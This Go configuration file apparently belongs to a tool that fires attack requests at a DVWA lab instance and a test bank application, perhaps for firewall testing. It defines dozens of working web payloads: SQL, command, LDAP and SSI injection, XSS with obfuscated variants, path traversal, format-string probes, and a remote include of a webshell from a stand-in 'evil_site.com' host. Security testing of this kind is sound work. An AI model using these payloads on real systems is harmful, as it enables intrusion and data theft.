package config

// AttackConfig holds the configuration details for each attack type
type AttackConfig struct {
	Method   string // GET or POST
	URL      string
	PostData string // Data for POST requests
}

// generateAttackConfigs dynamically generates the map of attack configurations
func generateAttackConfigs() map[string]AttackConfig {
	return map[string]AttackConfig{
		"command_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "ip=%3Bmore+%2Fetc%2Fpasswd&Submit=Submit",
		},
		"sql_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit",
		},
		"xss": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS-hack-attempt%22%29%3C%2Fscript%3E",
		},
		"os_command_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%3Bcc%20evil.c",
		},
		"coldfusion_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "name=<CFNEWINTERNALREGISTRY ACTION=\"Set\" BRANCH=\"HKEY_LOCAL_MACHINE\\Software\\Allaire\\ColdFusion\\CurrentVersion\\Server\" NAME=\"test\" TYPE=\"String\" VALUE=\"0\">",
		},
		"ldap_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=*)(uid=*))(|(uid=*",
		},
		"session_fixation": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=<script>document.cookie=\"sessionid=1234; Expires=Friday, 1-Jan-2010 00:00:00 GMT\";</script>",
		},
		"file_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "filename=C:%2Fboot.ini%00",
		},
		"php_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=abc;$_SESSION[authuser]=1",
		},
		"ssi_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "user=test<!--#exec cmd=\"/bin/ls\"-->",
		},
		"updf_xss": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=http://somehost/target.pdf#var=javascript:alert('test')",
		},
		"email_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "from=test@anonymous.com%0Acc:test@othersite.com",
		},
		"http_response_splitting": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "user_submit=test%0d%0aContent-Length: 0%0d%0a%0d%0a",
		},
		"rfi_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id={${include(\"http://evil_site.com/webshell.php\")}}{${exit()}}",
		},
		"lfi_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=C:/windows/system32/config/SecEvent.EVT",
		},
		"src_disclosure": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=test.jsp%00",
		},
		"java_method_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
		},
		"directory_traversal": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/script/..%c1%9c../winnt/system32/cmd.exe?/c+dir",
		},
		"format_string_attack": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n",
		},
		"xpath_xquery_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/child::node()",
		},
		"xslt_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/?arg=system-property('xsl:vendor')",
		},
		"trojans": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=/scripts/root.exe?/c+dir",
		},
		"zero_day_sqli_1": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=A+%27DIV%27+B+-+A+%27DIV%27+B&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_sqli_2": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=A+%27%5E%27+B&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_sqli_3": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=3%29%2B1%2B%280&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_sqli_4": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=3%7C%7C1&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_remote_exploit_1": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=%25X%25X%25X%25X%25X%25X%25X%25X&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_remote_exploit_2": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=%25p%25p%25p%25p%25p%25p%25p%25p&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_command_injection_1": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=%2F%3F%3F%3F%2Fl%3F&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_command_injection_2": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=xx%26+var1%3Dl+var2%3Ds+%3B+%22%24var1%22%22%24var2%22&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
		"zero_day_xss_1": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=window%5B%27ale%27%2B%27rt%27%5D%281%29&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		}, "zero_day_xss_2": {
			Method:   "POST",
			URL:      CurrentConfig.BANKURL,
			PostData: "firstname=___%3D1%3F%27ert%28123%29%27%3A0%2C+_%3D1%3F%27al%27%3A0%2C+__%3D1%3F%27ev%27%3A0%2C+k%3Dwindow%2C+k%5B__%2B_%5D%28_%2B___%29&lastname=Doe&email=john.doe%40gmail.com&phone=%2B1+514+276+0947&address=1145+Av.+Laurier+O%2C+Outremont%2C+QC+H2V+2L3&birthday=2007-05-30&username=johnd&password=73x7c4NYi8FrTt",
		},
	}
}

// GetAttackConfig returns the configuration for the given attack type
func GetAttackConfig(attackType string) (AttackConfig, bool) {
	attackConfigs := generateAttackConfigs()
	config, exists := attackConfigs[attackType]
	return config, exists
}
